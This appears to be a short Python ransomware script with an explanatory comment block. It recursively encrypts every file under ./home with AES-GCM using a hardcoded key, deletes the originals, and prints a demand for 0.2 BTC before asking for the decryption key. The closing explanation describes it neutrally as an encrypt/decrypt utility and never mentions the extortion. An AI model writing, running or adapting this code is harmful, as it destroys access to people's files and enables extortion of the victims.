import os
import struct
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        data = f.read()
    
    nonce = get_random_bytes(12)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    with open(file_path + '.enc', 'wb') as f:
        for x in (nonce, tag, ciphertext):
            f.write(x)
    
    os.remove(file_path)
    print(f"Encrypted {file_path}")

def decrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        nonce, tag, ciphertext = [ f.read(x) for x in (12, 16, -1) ]

    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)

    with open(file_path[:-4], 'wb') as f:
        f.write(data)
    
    os.remove(file_path)
    print(f"Decrypted {file_path}")

def main():
    key = b"iamthemightykingandiseeyousoonrn"[:32]
    choice = input("Do you want to (e)ncrypt or (d)ecrypt the files? ")

    if choice.lower() == 'd':
        print("Please send me 0.2 btc and I will send you the key :)")
        key = input("Key: ").encode('utf-8')

    for root, dirs, files in os.walk("./home"):
        for file in files:
            file_path = os.path.join(root, file)
            if choice.lower() == 'e':
                encrypt_file(file_path, key)
            elif choice.lower() == 'd' and file.endswith(".enc"):
                decrypt_file(file_path, key)

if __name__ == "__main__":
    main()

'''
Explanation:
Encryption Function (encrypt_file):
• Reads the file content.
• Generates a random nonce.
• Encrypts the file content using AES in GCM mode.
• Writes the nonce, tag, and ciphertext to a new file with the .enc extension.
• Deletes the original file.

Decryption Function (decrypt_file):
• Reads the encrypted file content (nonce, tag, and ciphertext).
• Decrypts the file content using the provided key.
• Writes the original file content back to a file without the .enc extension.
• Deletes the encrypted file.

Main Function (main):
• Prompts the user to choose between encryption and decryption.
• For decryption, it asks for a key.
• Iterates through the files in the ./home directory.
• Encrypts or decrypts the files based on the user's choice.

This Python script will handle both encryption and decryption of files in the ./home directory based on the user's choice.
'''
